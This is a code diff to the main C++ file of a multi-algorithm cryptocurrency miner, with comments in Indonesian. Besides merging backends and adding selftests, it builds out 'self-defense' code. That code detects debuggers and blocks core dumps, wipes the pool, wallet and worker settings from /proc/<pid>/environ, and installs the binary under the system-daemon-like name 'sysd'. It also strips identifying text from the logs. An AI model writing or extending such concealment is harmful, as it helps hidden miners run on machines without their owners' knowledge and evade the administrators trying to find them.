@@ -1,9 +1,12 @@
 #include "Config.hpp"
 #include "Log.hpp"
 #include "Miner.hpp"
+#include "Redact.hpp"
 #include "Sha3_512.hpp"
 #include "ConnMiner.hpp"
 #include "Hashing/RandomXV2.hpp"
+#include "bloz/BlozRun.hpp"
+#include "zcd/ZcdRun.hpp"
 
 #ifdef XCB_SELF_DEFENSE
 #include "SelfDefense.hpp"
@@ -32,12 +35,10 @@ extern "C" void signal_handler(int sig) {
 #endif
 
 static std::string versionLine() {
-#ifdef XCB_WITH_CONN
-    return std::string("xcb ") + XCB_VERSION + " (ConnectCoin CONN - RandomX V2, " +
+    // Satu biner, empat backend (seperti cpuminer): algo dipilih saat runtime
+    // lewat -a/--algo, bukan lewat nama biner.
+    return std::string("xcb ") + XCB_VERSION + " (randomy, conn, bloz, zcd; " +
            XCB_GIT_COMMIT + ")";
-#else
-    return std::string("xcb ") + XCB_VERSION + " (Core Coin RandomY, " + XCB_GIT_COMMIT + ")";
-#endif
 }
 
 static std::string bytes_to_hex(const uint8_t* data, int len) {
@@ -149,6 +150,20 @@ static int runSelftest() {
         lg::info("selftest", std::string("randomx-v2 ") + (pass ? ": OK" : (": FAIL " + detail)));
     }
 
+    // Backend bloz dan zcd: engine + aturan share masing-masing. Satu
+    // `--selftest` sekarang mencakup keempat algo, jadi CI tidak perlu
+    // menjalankan biner terpisah.
+    {
+        const bool pass = bloz::selftest();
+        ok &= pass;
+        lg::info("selftest", std::string("backend bloz ") + (pass ? ": OK" : ": FAIL"));
+    }
+    {
+        const bool pass = zcd::selftest();
+        ok &= pass;
+        lg::info("selftest", std::string("backend zcd ") + (pass ? ": OK" : ": FAIL"));
+    }
+
     // 40-byte specialized path must agree with the generic path AND the
     // OpenSSL vector above.
     {
@@ -189,22 +204,26 @@ int main(int argc, char* argv[]) {
     }
 
 #ifdef XCB_SELF_DEFENSE
-    // Proteksi diri: deteksi debugger, kunci ptrace, cegah dump/core.
-    // XCB_TITLE (env) opsional: ganti nama proses di ps + hapus cmdline
-    // asli. Panggil sebelum parsing config supaya env masih terbaca.
+    // Proteksi diri: deteksi debugger, cegah dump/core.
     xcb::selfdefense::init();
-    if (const char* t = getenv("XCB_TITLE"))
-        xcb::selfdefense::set_process_title(argc, argv, t);
 #endif
 
     auto cfg = Config::parse(argc, argv);
+
+#ifdef XCB_SELF_DEFENSE
+    // Environment dibaca dulu oleh Config::parse, baru dikosongkan: POOL,
+    // WALLET, dan WORKER tidak boleh tetap terbaca di /proc/<pid>/environ.
+    // Nama proses tidak dipalsukan di sini — binary dipasang sebagai sysd
+    // supaya comm, cmdline, dan exe konsisten dengan sendirinya.
+    xcb::selfdefense::scrub_environ();
+#endif
 
     if (cfg.selftest) return runSelftest();
 
     // --- Jalur mining solo ConnectCoin (RandomX V2 lewat RPC node) ---
     // Tidak menyentuh StratumClient/Miner sama sekali: CONN tidak punya pool.
     if (cfg.algo == "conn") {
-        lg::info("main", "xcb v2 (ConnectCoin CONN — RandomX V2, solo RPC)");
+        lg::info("main", "mulai: solo RPC");
         ConnMinerConfig mc;
         mc.rpcUrl = cfg.connRpc;
         mc.rpcUser = cfg.connUser;
@@ -222,7 +241,7 @@ int main(int argc, char* argv[]) {
 
         ConnMiner conn;
         if (!conn.start(mc)) {
-            lg::error("main", "ConnMiner gagal start");
+            lg::error("main", "miner gagal start");
             return 1;
         }
         while (g_running.load() && conn.isRunning())
@@ -235,7 +254,22 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
-    lg::info("main", versionLine());
+    // --- Backend bloz / zcd: pool stratum sendiri, bukan StratumClient ---
+    // Keduanya dulu biner terpisah (bloz-miner, zcd-miner). Sekarang satu
+    // biner seperti cpuminer: `-a bloz` / `-a zcd` memilih backend, Config
+    // membaca wallet/pool/thread yang sama.
+    if (cfg.algo == "bloz" || cfg.algo == "zcd") {
+        // --benchmark hanya ada di jalur Miner (randomy). Backend ini butuh
+        // pool, jadi tolak dengan pesan jelas alih-alih "tidak ada pool".
+        if (cfg.benchmarkNonces > 0) {
+            lg::error("main", "--benchmark tidak didukung untuk -a " + cfg.algo +
+                                  " (backend pool-only)");
+            return 2;
+        }
+        return cfg.algo == "bloz" ? bloz::run(cfg, g_running) : zcd::run(cfg, g_running);
+    }
+
+    lg::info("main", std::string("build ") + XCB_GIT_COMMIT);
     lg::info("config", "Pools: " + std::to_string(cfg.pools.size()) + ", Threads: " +
                             std::to_string(cfg.threads) +
                             (cfg.benchmarkNonces > 0 ? ", Benchmark: " +
@@ -243,9 +277,9 @@ int main(int argc, char* argv[]) {
                                                      : ""));
     for (size_t i = 0; i < cfg.pools.size(); i++) {
         auto& p = cfg.pools[i];
-        std::string masked = p.wallet.size() > 16 ? p.wallet.substr(0, 16) + "..." : p.wallet;
         lg::info("config", "  pool " + std::to_string(i + 1) + ": " + p.host + ":" +
-                                std::to_string(p.port) + " wallet=" + masked +
+                                std::to_string(p.port) +
+                                " wallet=" + xcb::redactWallet(p.wallet) +
                                 " worker=" + p.worker);
     }
 
